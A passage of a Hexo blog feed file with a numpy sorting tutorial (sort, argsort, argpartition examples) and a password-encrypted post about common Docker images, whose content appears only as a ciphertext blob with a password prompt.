class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#x = np.random.randint(16,size=(4,4))</span></span><br><span class="line">array([[ <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>],</span><br><span class="line">       [<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">9</span>, <span class="number">11</span>],</span><br><span class="line">       [ <span class="number">5</span>, <span class="number">10</span>,  <span class="number">8</span>,  <span class="number">7</span>],</span><br><span class="line">       [<span class="number">11</span>, <span class="number">11</span>,  <span class="number">0</span>,  <span class="number">6</span>]])</span><br><span class="line"><span class="comment">#沿着列排序（默认）</span></span><br><span class="line">np.sort(x, axis=<span class="number">1</span>)</span><br><span class="line">array([[ <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>],</span><br><span class="line">       [ <span class="number">2</span>,  <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">10</span>],</span><br><span class="line">       [ <span class="number">0</span>,  <span class="number">6</span>, <span class="number">11</span>, <span class="number">11</span>]])</span><br><span class="line">np.argsort(x, axis=<span class="number">1</span>)</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>]], dtype=int64)</span><br><span class="line"><span class="comment">#沿着行排序</span></span><br><span class="line">np.sort(x, axis=<span class="number">0</span>)</span><br><span class="line">array([[ <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>],</span><br><span class="line">       [ <span class="number">8</span>, <span class="number">10</span>,  <span class="number">8</span>,  <span class="number">7</span>],</span><br><span class="line">       [<span class="number">11</span>, <span class="number">10</span>,  <span class="number">9</span>, <span class="number">11</span>],</span><br><span class="line">       [<span class="number">13</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">14</span>]])</span><br><span class="line">np.argsort(x, axis=<span class="number">0</span>)</span><br><span class="line">array([[<span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>],</span><br><span class="line">       [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>]], dtype=int64)</span><br><span class="line">np.argpartition(x,<span class="number">2</span>,axis=<span class="number">1</span>)</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line">       [<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">       [<span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>]], dtype=int64)</span><br></pre></td></tr></table></figure><h1 id="Fancy-Indexing"><a href="#Fancy-Indexing" class="headerlink" title="Fancy Indexing"></a>Fancy Indexing</h1>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker常用镜像</title>
      <link href="/p/54b756b4.html"/>
      <url>/p/54b756b4.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0da98d937498c428ca32e5e02fc1c04a4d0e8241688a3609335ede971e17863b">c157c9744e0298d00173c08a9dbffe0e739306de727315505bcd710d66ba98b709ec5f1d63d3152e44b023ea3bf422c1cfa2d2652f4a2054e09aec054623ce90c81dcdf6dbedcd6aaaf1422e5ad1e6156ac8d561f0d04f616385fa179e843528efe87e7bae04e66d704f879e8e501f330c51ef37b03c13d08d82955ef0dbddcc6ccd1ce8394d3946c34cefe071324637394e9d8603d33ebdbca4758b0f84b52ccbeda7e324120352975e3fd4d0d9bbd946c77bea3f579fd04fb3a0805e639109ce86970e5a162537fcb715e227f8455e179429260b3231900b8bf395c13a84c82f49ffe67e4ac752a93e3a9861853051b1513b96a75141a4620bc35491a28d32d6f176a71e592f84d7c1c340ece01bfa182a8450cb652bbe1dab885e5f7f5bbd93b4592cbf2a3ad9b25f6c4deebf089a26953007d41d422dfe8d33ebc927240493a9b949d48f4d0b00c303b584f8269c1c1518481790c967647eafdbe64664e9e32112b0d959766a004460f195e0d82bbd4a34bbd4d145350e506aaa2adabf23ee1ba9e8f6d65ab903bf92a25266f133ccaf7d338a60187c01f1f8e821a6537c6e0b9e1634f87c36bd9238227ffa2e9ca49d6bebad4440a78a0fea0f35e6af6d6a5af63e9663d4adf05b8593eb93e60fc7ad08f2997c4088c694ed20b088e8e0e2359de8aa97ad0625061d34703facb832205630884cbd70dd42c939a93ce92301910a84372bf07892849fc6fde6abc4fef177bbf8a07da5322c1a11d285c390e70f130b44ac5dccf766984380dff19e7f30f7883fcc2ce152c2a60eecdc32949513c230a98ed85293886f4a35c3bc6f10c88cc4ad0fdac2439c26eb8f2b3aa2b9c1535bfa9c0707f4f34c0dae55fd5972fb2285ef12e86c462f7f51c3018d38129b39c4e2be982096044e19c7e26298f9809c684af535553f0b0a6eb3bbd0ab8cd1a6b33805f330f868fee198a693e43449c8357dd23070bb3da6bccd7fd40c346732c3a6e8ed9a3fe2461091b4f386a5fb8fe0508a4d095c749af576f34a20cf12a99963f5f17aec7cc767810415debaffdac863bd06240995211467ae30a5415333dd15d91132ae2933df723aa86acd66e866794159ad8684be92886682d6837ccf5e40c331e6a674daf0266ed57c810ad436bfed8898cd31373cf1f3947073b305a8f087c3af286208c379cec0bad2a3cde4a8418702d242c752040663960b1148fa2864a2717f644c681ccb27dd4368351809f2326ab69ecb3643ae206e6053a8b4447a97e764aa7f51346dfc1cb367596e501dd9b75659115049a55bb425e2576b646e26adbcc5b6a6c9ab30232f285978d512bb8c84e6bbb29733e7b57e8a3c21bfd698e71b776ba120edc24e2443e0515e69c6210d25b3ff0beded8f3a307f72df74af541cd222cb06804ad4c717c9b2b82174d3e16a26198434387d84bb4680c70943b379e0ba9c07c65f2365a05bf4b3ad5219fd3a5124303c3633963fcb3325dd4f75932704eae089fb8110ae0ece853797227cdfee3faa5c03765bef220adce463d832373b5433f3f9ee36948d6452d37ca71772918f01d0573b03f1b1da3c018c42252ef2c08135e0611713fd0c863eadf25f44918ae1e91c80e0d73a035d39686999ba87c568e78bb6c75b72466605640f6079cf432a88d9d3444bfab519b4180cff693c1fa5bc60588bd7c2ec1edc2d2dea65007515619c53ccd6696a76624757115e40c427761d0ed752b12f3f68e78f3535e1e97377c9e0d9077000fcd649a44a1088d3e29ccd97c40c88ac09675019c27713614780a9b6795330e14176fed4a26b8eab0cdff93838a9ffe09f3285b56532a8ea505b9f155c1202c64bf467e47d3270be2d963acfd5be3e23f709e844d550289aa12c1938ab62fac2d47b6b9653ca7e0053c3a949cca21557cb13c1e5515918fd6864dc80d5f71607c884f829a0134f010779549e47df2ce421e5f96c13508b0d1615acf01114311c51772abb9ee4544264b13201e3bd74c7ca25a86e4f2f5a29b44cfdacfdf837641b18ca12a18367e0a3e99e2ff7e8756da6bd2f73bd10370d90dadbaf527bd789810d6d1bc24ed0ad231d462a4cca18f2d2c9ef7ef54221830f8f85c46d0d7ba46011f8ba444952f00d14b2fe1c65a73af0cdfa4d959c4f6628b3726142fca1e28faff318d008103c6e162d1aa0090f8703f00cf1776cff66b492d8dd3963743729c9496151e6195cc7d5527b5ab5b851eee2ac13c08e3db5f537f4b5c7c1dac1aa24088b565f6c4daeb12a9b0d2514dd50c338f0b4bdea4b5e89e5b47b5e56e4dbe0ce1f4dbd17d7580e1decbf4525f97ce47bd7db54fb3975d44a10a4fea82ed598f5591742d7db94b2421263e73604f8e2fede82a5c63970f1dfd177b6e0d5ca3e9f46d8b958058f863f2427d2d0aca79ba1df7b8707fd1452d50980b19e5e3bd0466dd4bff3b81d7c649f7969598fe68e942c15db594cb432ca4cd52b36a87c97a70f5f4b394a2a7719b82c9a6ccccc516c6b2bb8ed75e291a523b023643541ecf7d1b66766f6f103c748c8a78e8612f6e463cf0b276e01516e0db3113edfb3f318791d407289c0b97fb728df9c98c7158aca33045a8cc384100bd0e56ff534a29b70b4038de5edb6a1ae9857fe60948a645ef20e4ce453ee9d49f982748127864a736bc4c8108e3a4a4c6665273568521280d4f5381380c07233b59eb1bb573b4b401ba1dff916ada679a55fb34809bda79f25829e8a9c83145210a6f52b6c9427461294d3d33779bdcaff57b28d6c51e27d761ce768923bfecea4b4ecd2edcdf2c1fc46412b308ee05782e323ab234159b023d4e17dd5000190c8a863069330218796349adb7a3bb87069d78bd075bb6d02c577ef213b26d07c77f1c46c76eb9e1845d4d2c2d8173dde6d5953c04b70dadce8a1ef8e8e17a590f8be8672cfd3bb7c91e155ce8faba0de82e08fd89a83258ed6bb097fbd027831f0fdcb1cb73ed2d9a206b2c737eeee5d61840e11bb7b6b7d92c6b984cbd8a897bcc0ef96533ae6150d4721f3dbe661616dfe9c61c14ce759a4dc310f1427bf1be920d14df71117b8daa6e75b301a5ebc32ea81c1e2d336c7659e65c89aa1d4148bf9f53af6453d37e38e783e9e0ecec595e01fc6cddb7da3e24e342d0734c36621e9d9c48a1643514938af0c089e292d1a38bfd3bcf29b296bb811d329b8c9b9a52c0275558b1d1c6f14e5ef85c469195b0b6e82afd7978399fb72e4b2930a937984767d25cc69b5f95778f98c4c89e153fbfb9b941602e56003cd73a28e194e1209c26d7d6943cfdf1eaff7c3c199978d2fad2a0294504f0cf3273a64963c06808aaf17d1123d88631e8ed966ad9ed614e0474fa898421d1242c85f60bfe743e2582e19df0960617baf544130b9a075306cb56898b416757afada75a4851fdfccdac79c0036b2038f30160e518c1565f4ace49f657cd69fdcd75ffa70f9a7ebde4539f62f40ee66e950287d243bf2622e645db493cb3904a6dda8e6c543deb18a43960a4e5993d48416503f8f70cf933f21017007a37ea0f2e6d0f25351ebb9422c6c65995fb5d50163e7355f7306f6f3898a0a2e9eeb3caf353bc53934d722161bb8ff3cfb989a76d00ce2549558c845d992b89426e35f92c469e9f97d9244f2b043cc97f1b56cbf6a6f2a96514efab739f4496401d9940e7825646134b4690590e4f2bddd3692813cd30cf73ce86d1b954f9d2f3072617321d2944aecd461d073fd136bc4d8e79199c38693d3320ac002031ea2135d57a317022a9dcad69eaeb6b0411d7cf2f91239d517cb43a404eca860c61c5c198f33488968fecb0cb455a029601350a8c794d634c1df4560e72f3ec28a8b156254661ef52fed810c6477bd31bde7d4261781ddfb8796798d48598a7654645c825de01814339f7a7799b2b1f33d53225106a44fa4471580e871107091f60051cacb8e3b734072f219a5dca3f69523fb4db135e8be3742313430e8c75408733db929d759ec48c7bfe208e98872521a496e3a4cef2eb2226e4a75a6777c58869d6192ab9b029ddfb2c3a98dd10dd5fe48f83cccfcb56bb69067d2a1f5dda27023fe1e4a8a005bb73a8f5657f9ac8660e4365ad1ad34593113bd3c3c6501052644f6ca3dc6fdb4ba119f1eeade3444f8598dc8aaa73f2d93c80f73f5b4e1b0c577069ca5cafc38173b2277c26ca8d9970262d1cb29f6ff2b4438f32fc721076dc32fc39f99053a7d0f38238ac71b642987200b70d3ff27621484cee731f5036e66e04d314f89bef3c96fda8df67623053282466637141610cf78d25f34ea540dde3b228bb996fe87afc92daa7b7983f6f918f442f2c2fc638971baa0d508acf14f2211215253ed94be0693f5fb4ddc601e730c299ff772660d88112090a032e534478a8eb15c769c40817550a2210796da5bc4c6c2cd8a70520ff4d6a898bea03a74a29d63a9271ccbf3d46f90706004c667860a0efc9f6df41c5936e93a61887b3c51bce586117552016dee5ec0d30d1737b8a1ab91b841ab8cabcb4644be52d81a9693d9753bd9d4e210881e40beb5bc42761cff933b4276699e7122d91e2696e1615f8d75538e020cd14d4a0840b96c685ec6c86df84e89a802236f867c8e552c7701a54889c762c70f54790353a9a3749a95bb87a99077c24ca821bb6d477ebfbc6b7b66165caffb2f7da82be63fb14e89521d0610d3402f194d118de51d8dbfb8f79ff23887876346cd906c82f13dd6b1e03638fbd082953823819fd26474b7707b427bb2b7501492773e6d8391be06927cbbe96b6f7401333639ad31a22218e750e07889faf52c8767e10707669e446083e8ced6aaaf35ad2c688326494bda2ad9b720633cf90a1e8c57f18625dd8754bdf835050406eaf84a2aedd1864068098391aeda9815017c5fc9a6eef7409e71fc1bdcec6a547d77114fdf6b8f5570df89ed67c514db5c5f472cae6603cfc5b9441856bccb68e669471200013b8c0d71dd05572ffa1d6fe14e3df6b3838c0a81fd405f4b8c455f455d691e2f333fe6dc4d53beceb4c80ce2d72d5c36484ac697cf25ef5394761a779396453a46bb9c489c6b3fe4f05043675f3694c034a7a8920b5b645dcdb1426f232046a128fe7927026f43c247674cb41c6c7e09ea5605edef1f23a3122685a12d5193811bfb2958f06009b936c589a19aa4f5218ffb960e8fb882466b0ac51bff4748661ec4c3659c2b654a724bb3208a6ef32d3381026978be3aa35818330ac159ce6e888242655c8ed5271a3cd2a0cd5c00ee67d984e70ef96f4c4c8384ea47313d591395af68748728e1807ce36a7def25dbc9fba28129b9e0958db61a04bbcbddfa47aef48bc32f86150242c5ff3f68711b84a78c252dc6c5b92d83790c63a75f43086da1c1994edb1042f7c17a36b1cc4ee61d6dddacec124f3224c690283627f74b054bdfe38a2257e959dde87628fcb4f6adacc7d5e4243dc71968a216fcad908e868c809535112ad8b279de6d153cb01fd4ae5d685ece812496a1d66092a64efb1e4bb1facea390f788087cc416f90dd38cbefbb764c4c74cf99660b582bb3d90d4c6f690b12e0c7dfab0b7fa32d2a44df075f023ef8855dc7c355404e09015bbf3d142d593f11f0d86a2a220a28d6b3fbdacf11f4db35abf6e98c26fe4e9c413b50bae175a3418c53c04cc7abec2d42c05607fbbfde8e0d29228a61702c9dd9882f2c333c11b72d91e0c4d136144895cc1b6f881e74f5bcf6496bc76c5cf99892cadff2855f3fc7402fe842642bbc8dcfd6ced577e2af81c42d9b0a3aa1aa5ba2e1dab4729a4e485f6844df302bd6b3c3222d2f2dcb192e83395e7c3a59dcabce0e4230b974735fe05eab7f26f3fc934aa73221ee86cdef19371d071d69563d9fb0f9d6f3c12b3a51d509b3bac16731c0c4a00825608086d9aaec24b7852bfef96e19d76aed1bc6199a2f972685e0ab4cdde8f23f2c909a12abb39020dd89d8660fb3a066aa6f3669faa0331084e3079ecb02fad7d150b0c17606abe41a49e69bdc393096009a46f7e1cf4ec6af2ec1ac012508d034f002481ddbdd40e7261845dfdee821e72ad4c334d416fbf0879393557d6a06a2857a5061f3c473d5150e86e449b56ef151a6df9ac85010666435563f58dead5320c58a06f1826c2241f3393dc64540cd95fcd8dd9cb7ced21358c7c6bbede0f3dd3c9753fc73f1656bbcfdc7e456e25eb6bdd9b44dc378ce8e2f0bb5a4d366847b66d77df40bef54ebbad5b9eff3cab0f67a2d4a75d686bf213756a83d66bf54cc98465c7af42b4c415df479e0e650be5c8944e49bdec459a6354b1d6c825b8ab1f412921ee8aa735186ee882a14fcb69695bc699e2a49bc2bfd52623f8a22e65b9b7e24d5fcae37669dabd422e8d2a555b27f16e3c126ac4930a31468b718c1ce57525db8f2b3284ffe54cec9e0623a03efb70ccd02be5e910140db69c96fcea64633486e4eaf1ed286b1da794e9810e5d642326141215a755eb954fe9ea74e5152aad7751ac7498c4b71fb37fcc5dab175cc9224e2ac946736babe1e35f68894c10218878c8755a0e326f9b89facd64cf74c78b48cd95aec24205d425a7ad6bc7757642af30a3c98f6d74202b45f54039d669aaaffbb44c27bcb516e22150fc357ca37537f429da573fa2d74b8ad5478d6108731fe107f9564e2798bbfd1b8b5c84074b9f6ee0641461e7727ed8478ceefcc33933cd53e93bc299e82223f67a898d00bd06106384feddf73021a68bb78ebf5c1b1ee1a0895a5df4c35168d2c3c2c5e35cf73e5567b665d89bc5cafc52630d9a9482ebf33eaa82ec56aaca74b0ce7d40f5d33b8c7b12148f643f81919a67ab082da013d1cba05703011544dfcd8d18ecafdcc14fac508faed0b39bd5a2385655c7544404de254b8e85495a6e2d7b95815bb31d3d13efc1c395d9330f566d21c23668ceb47b12d1905225e1607f83955c5c33f8738ef0c55219ac913580068b7de24f1326ba5522eba94d7cada66604948ff60f22d8c7f3d23c72f438e638d418c8dc2612c8b6f18f42eaab1ca12eb9a27d7a89ac680dafdd4cfb4517169c66f5762e8bf7b8035ad2f98163bfbb471b9001ac3b74d7c177570472217fde187eef64b2febc29c39092cbb0407f76d5eb1db00561ea595ce48ac8662f10b62a57a07224fc8c3e56701614580f7b9b9316865634244e78d9f4e3eed18fab66a5d696024488633af06051d456f962d2b183fc66f7737efcff67c5a90ae900402e8bb556b7ad3e2e904c33a67ace3154e9e4b6b14bbbf5508c50224847a868fcc4889a17f15b9e8316e2da2a3bc28d6f69080a2029aaf1fb1f6b9bf0e597de281e2f722b5962e577efbe108e1fbfddcdc86f5058cc05cc7264454aaf8331ea9392b2771161c34fcae752f9c6cac35768f035e0c2f27906bd443e55549b06461ae315e7f3d336328a6d9acc45ad876125683df9e52ccbc62f736de450e042615e110ee4198781b7c9fd1a548b46e17e23d17a07399df6b988347ded5a4c547a8c2eef113e1a5c3979a262ac0eb0dba39cabc0a6fbd09c895259fd9e5837408bedda78beaba5cebca646b50781fc964e9603224ae5b8e1ab364dadb449e53a2ea1edacf9265562d6cf17aca251c84985841cd47d639cbe222c13ae6a87ae68360374a7229fbc958e199a7d3dff7a0fd6f2fdae35d38b33ebf532fd27a4169eedac2c2853e2baedee14dbd5805e63073c0f933c6378c81d20e904d9241009013231ae25f49dbc5ad193a8283df6b442781ad57a5fa72e5659e8a7e1769cb6763117b98633fa7158ad1d3ccaa5ab1e6ce232c636735959835fc1ed06114fd5d84cc8239dc5935aea673d5558601bff2ac1faca92bc8207f05469f92dc403d40b8f427f5a13904c866a520abe9b7a03625b6d870c11fae6938cdf99a38b69a76779a3c174ee10bc8bcf2346977372f3a7da80770272dc0bd6b05f2bdba5b26573c2bd041ca961fb647559d9bad160f3c403a35fef720bbd3f1aab42b51bdbcb5013336eef92cea3ad084ad48c8a7633be5818b9382c3bf176040ca67f65c614a9e817f5f8cc0a9f057e689586f60b533efca36536eae7151ddba26d36aeda15b9e6696717b20f71790e5fa9ce7797d5393e5a3bce22db815efe16bb62b453d2b380e74a99d157edf50b4551d6f947319d418bc28495ad22856e3ca8d953585b9bb10ada4b24da3870224328cca2bee506f1c5a2c1e0030532b07945df5686edb4c72078163f23fe6e1b1624cf0a2f9f6802dfc6f7163f8e6d202c0f1a3b3b47f4f048f87ed558cfdfff47648b0a362258cb180c92faa1d1277b796a064d9626bab73953cce709c1e0b56001f9f1c3c1f457bd846f3c6bcc349ffb0fa8e56b72e0ce13060c8d7411fb60900af53ceb37ca21f238e467b9497260e45bdd75f9b555d917477e83b416af3bad14b3496fa5dce7a3868a09bbab964fe24a139ea297cbdd7cdc837cc80f1a1c2c7f58e0c4923afbae212c26191d3e8dc5f10dfa198fccc1042ffdbc9f6e6cbfba3ccbc024710e5e60a8b4cae8719dba73ef4b120689ceaea3222e4cb26344c0c236cf727cd1edff0fee1309d24b3b2f6e73540a7fdd1f8aaedf7c34b9307ad346ec20476d3bdd9941eb6baa13884eb4aeeeb167c1f918d00ef6638ddc284c2780206f38de4f61c0df6f9f0c3dee855dec98cb6dccf50169e334ae45a5d656be1d24f688e7f1a2949819f126ce6b3fbdb10bb4a63a748d2ab187ccb447608bf54612a267da9c6358325699e4cee86d24bc7fcb6dd24409ffdf642542f73ab95848ada13dc14fea682ce006c7e3f3c7286d5d4e32663ece61a9fc3968d6e1aca85bd4a817e0f62db7cfb40064d0f73308716cb2f35ee024859f93bf732e866c951a3f9866011922699420c88e82e29894257325f0a783564ae6cb8450fd3132b8908a1aae622e99de00047517fe5779f7bfa09cf6816098d27b15d542e0584ce8e7501709b36aa475548e5d114ab5d73482c9eca929aba688ac0f02a610a429f547fcdf9f4cdb55f1b68a0d494aae580baa9c43f7cf3fb7bd1edc70fa5a237e39c5abbcf61289d35c8118c0f45b70e93de775d6e8cee14f5c698bcdec3581db4dc6c1cc085efa703bae79f1f45249ec4703ee9bc4141cc2832a999b657ca40cdc3e45ed7ee600f78dd2b87c857cd8453a9732da664e49fa5680ddf200f271820a2d8f6d1c0efc924d46f427082a75e0a1a39692fc23a35bbe3c1ba5f6aab63f0620aeaf98176bf55dad2df227f74fe4c395a66e91772cf072bd60e5e519f8a7b6cb25d15c36771993c3ae152505f17ca9b806ad0f101999d5122aa9ef8b38636311a0940f53f66d41d9ac73dfe62dfadb3f06404cd06af48ca09222740ab0dd97d4c144ee9f67a067468fc0ebee3a88af7ca3d80445bde6b8a9d92ba6546b1ee5dabab96a2cf3f7a08ffbfe1855a4e7b7cb8baef6dcdee31a11cfee6be0f8747da565579325f841de5c61bd9c985642a34157af61b2bd4af0c3c8ca52ed7fc100ff429755711fbadf50cadb15d8a8886c33ce0819ee5cd8a0a9012f38d29ab9a1c6da091488d5adc8f13cf90d3d813d9936444e1b0b1f48869df7ec1442230f1cc4877ab488649c45b4299b302ac0a6dd8ada7bbf57e9f45a276e7a2a1cbd5e34d7df42b20513d36e7c5fc5beedd9ae8a86cf1508dea0cd48dc7936be764191cf19421e6424da3960efbd9f9334f152b4f00951f4b01213f863498d15ebf010c484fd40221769697b17cba0150cd2ab6f58751dc8ecf35b5d2d9bec6f9b080673b021e4acda9103d374d2266a5ec811055c62a3787991c67b8a36cb50f5751def60e268970c7f0235d536aa2ecb098e282c276c5a9e36ca6c1a752267558a3c9f904cd1c129054dec84d2b6ebea4390f122f57c1403a552ec85dfc649e834d9f19e47341b7df8328f07590ad072f3470cb68a1565010fc8a04a8b8b27c8fd41b9c58c323d82df870e1f6cfe72126bbe316881e41d915a5ea4432881219e1740d253456a308fde12b7e2930ec16af3b1e418d768c3c9c76ec0a6da838586ce1212cda937b3ae6fa14f3c4cc144cc1bcbf071bb29c11d3200e58cae2dd5d998d9dc62306938b9f694edddde3876bd89f329687426b70d03bae5518d0726e25611f3c85d7717754a13ea4fef0e24fa0e95369c606610049e684c985fc077309cca59d5625f1a0b09dfb6c8b440026afa2a902009cc24c88a8b08289c4ddfef737615e4e1c6676376351b523939e73098e6b15be3114693aa401ee82a8eb07ea727db4e8b5fea7e3478dff4d819c63e5a3812f0ca6a11a8bde024db9073cc2e0bc1ac04000ea48be66ac51c13ce2eaebaf7ea85e8030cdddff37950b54e65ea7fb0308e0ba8693ba287f6b1edfc346160213710641ce4e938d9c6a746c583fc18581fb19e80c0d328626a8a9a640ccd366f35c8df80e0df8939802a0440d2ba0a6fc2afd48f599d34aa3b7bec5dbd494f417ad7542befca52c9908eda9577182697be8974b35e77a605b865fba787d9e61f20d1eb082d16cd6533c5dabfea67bac0db29bd32d7286bbc1c63ceefff123c0b11ba4727c45f38d2848bbbee089c60c6bd09f214fe149d6f8dbe945139929cbf1d74b2ea0f909dd184886f6651153dabbcec4da933e6cdd53bc71401c644b5675f71abe9c6a6deaf6f6158f6cbd54cdc1cda79d6097722f8f9af103082cb5120f73a5a6c2280e65297a9bab254d2c23d0c6ccc9af25994041e54d040205dce6fc1f4d67d705404f52a61dbc8f19159f108f88b3d99c4d9c58498d40b5de519b611e73ea207cd5aeea3ba6015da547521de0908b6f5986e505689babdc2f4cd53965a0d8c00bb302f9352c2f664b7ae578720a40b8e66b70e7430d34ff2f740ec822dd2221c794300307aade4818dbec089f9d62bb27cf20846b27b14e20fd094fe8d71c2e8c46cedbbb8c0ff8cf2351e93a6352a4a2df17e0079cfeb5cc7e037c139a4942d428f369b3287de24f0fb4d50d0c7f6af7ddcf2832f6e308d80c7ec4e4ec93cd7a4493982692b6715371c1969735e4d64592be080283b4a33a5fe57fc8a0ec3853007b2a19b98eff96073bf3e335491a0a7b625f39eccdde31d65d9928e2fc9d040de729a3a094eb4d51b044316a5e59498e6a1e9ec5e3e12e06cf2c168306bb075d38e6a6bc953486ffc5f810475301704e41e8f5f917b3d7d6cc9f3e64cda3bf3e05886de66c39d938444c6641d72c77c88940ec5c10c8eea68cd92a74d917540a7752b69f838b91e14b338caa79e76fea91d9973efe022d33ac3c5dea9d8602b913ec4a3e0e2521ef83b7cb919400a61c4467505cbec4e266e7c36ada0037de61a155ce55752a139717a6d10c45c0e3099c050f1e871b29ace162ff975e3389ae7667c8824c349028beab10944b2d67e5b7eb5a309a07c8e62a42d77c3cf950168e6386facead5b6b61b5299d2721760794874ef1d2b9c1b4681b1006de26b76b802788e0b69f02c2516a3ed5c5722328994cb0a1390be7d04d7218df2529841b6b2fbc9b9e4964d156150a520060b6c701d3f991fa29c8e6e9e86327091097b2eda481080180475ceb52968fb20efac8409ab91bcfa7609b5148f47cef500f0190c7615b631e99ccbb022956efac4b4ea8a2241fea01d53b5b900abeeab9fcd119ef9c71013f7b625ab3612d53e103f3aca275294d459d55b6bfa8aab48bb46f4bf91787146e686214a9479f3096b2a847e77aaa20d1ac2b471af9c783990d51587134ec1d37094f622e5499c6eb0b36eee398bec5659cac79997080d57f57061b1170a8066950e3fd6d410be58b56ff68275049f5f1fd9d413ad5cead0ad76a98c75420b7e15fce52b80f4b38f73b51d01cf06870b3510a98a7aedf7804b93ac27b10b09546819a8c173721e541af6636cf08fbb0f613a0222b621cbcfc3234c04e33e8b7a9a6eb2615943ab117a9a950e9995ca86375be7f4c23f043d3ed95cc239f3c15131db2695db2a1c6c2b3289edf565f17da88bce92dc3de04b989260a54ca06ad1424ec3ad9db7ff59493bb0fa54de373bf958cd879d3704b3fc54997ad9139d27f7223ed685c9f0ccb18b5dbd070405c4f4f9f22cfe4c4c3e7d8732ce3d8f30d900db692b4ca5ee3f878adfeaae7e09ca4bfa2701fa1d6b3324fe223b8ee7b2f336547fc2e7032b3052453ee9e5a77b39e8b7beddddc76ea8270a8414be64b84a9ede7a17f831f163e4fa6396202e95c939b34d8400bcd11addd9f73323d2ad6aeb08cd8efadad6788c818d858c2f15b1fc1e7b5a14839963207241a302e239848aff7eacb744c21092c1b214a40a2901b10af7629dea51e9fc0c371b3708431023c411f3d13730e2b127c65646237fa2a21fa27bf7ba62d44ef2b46380980b94e219697eb103765c528a138527d8b456646f195d5b4ebfc3ba450aa07b045b9e1595d455c1be2a7e6fd273e4a2d022bfb2bd62411d8e485f05fcd35836bccbb80471fd5fab8c5be75c5354a47880ed903c8a117bc6500e48769deeaec13fdf78e9f7e86830d9b02e263f43c67807424d7708bc14f4378a64d7c4e036ffe6683cdb3ab8368a786d6e7e281935b79714b41664c84abc30acfc8eb23d7a7f60c4fac179480c7fcd7881ae035853aa7a944d013cce96299ab9240a2874c622a509ee3e079d68909664a566054f537454d9529723062a484109d6195bc1e2d7706813f23c9303d793a5aef11e994c76e28f6d08e0d72f84d78af6a08b9b2674c60619e44c98b197e74555976efbc8dc6fc2dae93c992f292f90941991706e0700275b631edda3892c2b7a3b088b1d2d5f3ad9248ec0ed93e526028822288838060fef61dc997486873948ed05b480012b4446e9cc4b556365c330ad5cee3f7927604f9cd6919b0da305599ee02ff4354b443f5ae8767ef5466c74a02f9a6366815ccc132413ab066741ef9994e5ca1df531696d7f1405493972a9f53b279e38e855aac92aab398962ad0324dab32fa78491d41cb62cc5cf332de1d3b72bf19b2d1416ba04928019a3d6a1ec1524c71866e443b997ae5e5ebbc1a89712ae697080d8d192e847146dd0af4eb57ab503590e30b78b550d78990412b30e664167a1648432c96d0a9804acf035e5e57c99587ac6406efcdb26dcc0202f22b0fe8848918876cc881d06c6cf0657d2e82e7f5b615701e25815610e253714d2322b0006580e678cb6590653f4ff3f42201556e4870d84eb98dca38998557bb8b766b29e56cb76ca4227fa3d72f8dbd4727433bcffa86db3b5cbe0ffa2edc068d06fb807ac15fa997944dc70e104e87dc1ef372b129db8dd6e81a81a293853bcbfdf6a1785a71535dbac6158fd7448957ccbfee017bd872ffc30ab6f1d09cac66c913ff543dd7a51a705e84a456db82244be8154bbe4ccf1e2145890b383c48d73bb1aa218d2e9e85da1b1d893538515a798127aff21b1ed86d2e3e8154b51911d729f8ed212cc9e405ca65a0a6e8d6173cc6de16a58436b100b5f60e50e82a0846d949a4c8cf2bf0a4a7d9d049fbc6307db7a539aa7ba986a66cb76c89ee5193f1ea5810804fe8d120e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link 